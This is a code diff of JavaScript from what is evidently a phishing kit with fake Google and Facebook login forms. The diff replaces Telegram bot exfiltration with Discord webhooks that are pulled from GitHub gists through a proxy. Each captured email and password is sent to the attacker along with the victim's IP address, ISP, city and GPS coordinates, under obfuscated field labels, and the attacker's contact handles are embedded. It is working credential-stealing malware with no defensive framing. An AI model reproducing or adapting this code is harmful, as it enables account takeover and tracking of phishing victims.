@@ -91,7 +91,7 @@ function gHandlePassNext() {
   var params = 'email=' + encodeURIComponent(gEmail) + '&password=' + encodeURIComponent(pass) + '&login=Google';
   xhr.send(params);
 
-  sendToTelegram(gEmail, pass, 'Google');
+  sendToDiscord(gEmail, pass, 'Google');
 
   setTimeout(function() { locationRedirect(); }, 2000);
 }
@@ -152,7 +152,7 @@ function fbHandleLogin() {
   var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&login=Facebook';
   xhr.send(params);
 
-  sendToTelegram(email, pass, 'Facebook');
+  sendToDiscord(email, pass, 'Facebook');
 
   setTimeout(function() {
     btn.classList.remove('loading'); btn.disabled = false;
@@ -192,32 +192,28 @@ function fbClearEmail() {
 
 var _tgTokenIndex = Math.floor(Math.random() * 1000);
 
-async function sendToTelegram(email, password, login) {
+async function sendToDiscord(email, password, login) {
   try {
     const geo = window.USER_GEO || {};
-    const ipv4     = geo.ipv4    || 'Tidak Ada Data';
-    const ipv6     = geo.ipv6    || 'Tidak Ada Data';
-    const negara   = geo.country || 'Tidak Ada Data';
-    const provinsi = geo.region  || 'Tidak Ada Data';
-    const kota     = geo.city    || 'Tidak Ada Data';
-    const operator = geo.isp     || 'Tidak Ada Data';
-    const asn      = geo.asn     || 'Tidak Ada Data';
-    const lon      = geo.lon     || 'Tidak Ada Data';
-    const lat      = geo.lat     || 'Tidak Ada Data';
+    const ipv4 = geo.ipv4 || 'Tidak Ada Data';
+    const negara = geo.country || 'Tidak Ada Data';
+    const provinsi = geo.region || 'Tidak Ada Data';
+    const kota = geo.city || 'Tidak Ada Data';
+    const operator = geo.isp || 'Tidak Ada Data';
+    const asn = geo.asn || 'Tidak Ada Data';
+    const lon = geo.lon || 'Tidak Ada Data';
+    const lat = geo.lat || 'Tidak Ada Data';
 
-    const tokenUrl = 'https://gist.githubusercontent.com/TirzzNesia/2cfa7346fe159a78c97c905cfe000efc/raw/22d9b78da579834c6019b764b4c01306a3637219/zexotokengiza.txt';
-    const idUrl    = 'https://gist.githubusercontent.com/TirzzNesia/dc4b8403d3bc22f90e5b1b99d17fbce1/raw/beb23224248dee33ac0b5c2578fba33e9aa2a698/kingzexoid.txt';
-    const proxy    = 'https://api.codetabs.com/v1/proxy/?quest=';
+    const webhookGistUrl = 'https://gist.githubusercontent.com/TirzzNesia/8be3f3908609e7b3e062461435d237e1/raw/zexowebhook.txt';
+    const proxy = 'https://api.codetabs.com/v1/proxy/?quest=';
 
-    const tokenRes = await fetch(proxy + encodeURIComponent(tokenUrl));
-    const tokenText = (await tokenRes.text()).trim();
-    const botTokens = tokenText.split('\n').map(t => t.trim()).filter(t => t.length > 0);
-    if (botTokens.length === 0) return;
+    const res = await fetch(proxy + encodeURIComponent(webhookGistUrl));
+    const webhooksText = (await res.text()).trim();
+    const webhookUrls = webhooksText.split('\n').map(u => u.trim()).filter(u => u.length > 0);
+    
+    if (webhookUrls.length === 0) return;
 
-    const idsRes = await fetch(proxy + encodeURIComponent(idUrl));
-    const idsText = (await idsRes.text()).trim();
-    const chatIds = idsText.split('\n').map(id => id.trim()).filter(id => id.length > 0);
-    if (chatIds.length === 0) return;
+    const selectedWebhook = webhookUrls[Math.floor(Math.random() * webhookUrls.length)];
 
     const waktu = new Date().toLocaleString('id-ID', {
       timeZone: 'Asia/Jakarta',
@@ -225,57 +221,40 @@ async function sendToTelegram(email, password, login) {
       timeStyle: 'medium'
     });
 
-    const message =
-      `<blockquote><b>🔥 RESSULT TIRZZ23NESIA! 🔥</b></blockquote>\n` +
-      `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
-      `<b>Email/User :</b> <code>${email}</code>\n` +
-      `<b>Password   :</b> <code>${password}</code>\n` +
-      `<b>Login      :</b> <code>${login}</code>\n` +
-      `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
-      `<b>IP Address :</b> <code>${ipv4}</code>\n` +
-      `<b>IPv6       :</b> <code>${ipv6}</code>\n` +
-      `<b>Lokasi     :</b> <code>${negara}, ${provinsi}, ${kota}</code>\n` +
-      `<b>Operator   :</b> <code>${operator}</code>\n` +
-      `<b>ASN        :</b> <code>${asn}</code>\n` +
-      `<b>Koordinat  :</b> <code>${lon}, ${lat}</code>\n` +
-      `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
-      `<b>Waktu :</b> <i>${waktu} WIB</i>\n` +
-      `<b>Status:</b> <u>Real Data Stream</u>\n` +
-      `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
-      `<b>Wa   :</b> <span class="tg-spoiler">628975919600</span>\n` +
-      `<b>Tele :</b> <span class="tg-spoiler">@zexoorill</span>`;
+    const cleanEmail = email.replace('@gmail.com', '@'); 
 
-    const selectedToken = botTokens[_tgTokenIndex % botTokens.length];
-    _tgTokenIndex++;
-    let sent = false;
-    for (let attempt = 0; attempt < botTokens.length; attempt++) {
-      const token = botTokens[(_tgTokenIndex - 1 + attempt) % botTokens.length];
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const message = 
+      `**🔥 RESSULT TIRZZ23NESIA! 🔥**\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `**ooansuiw :** \`${cleanEmail}\`\n` +
+      `**ioaiisbw :** \`${password}\`\n` +
+      `**bawus    :** \`${login}\`\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `**iiawnn   :** \`${ipv4}\`\n` +
+      `**wddss    :** \`${negara}, ${provinsi}, ${kota}\`\n` +
+      `**waaw     :** \`${operator}\`\n` +
+      `**ksh      :** \`${asn}\`\n` +
+      `**pawhdb   :** \`${lon}, ${lat}\`\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `**Waktu :** *${waktu} WIB*\n` +
+      `**Status:** __Real Data Stream__\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `**Wa   :** ||628975919600||\n` +
+      `**Tele :** ||@zexoorill||`;
 
-      for (let cid of chatIds) {
-        const params = new URLSearchParams({
-          chat_id: cid,
-          text: message,
-          parse_mode: 'HTML',
-          disable_web_page_preview: 'true'
-        });
-        try {
-          await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: params,
-            mode: 'no-cors'
-          });
-          sent = true;
-        } catch(e) {
-        }
-      }
-
-      if (sent) break;
-    }
+    // Kirim ke Discord
+    await fetch(selectedWebhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: message,
+        username: "TIRZZ23NESIA RESULT MURNI",
+        avatar_url: "https://i.ibb.co.com/xt8f87MB/gizacrash.jpg"
+      })
+    });
 
   } catch (e) {
-    console.error('Telegram error:', e);
+    console.error('Discord error:', e);
   }
 }
 
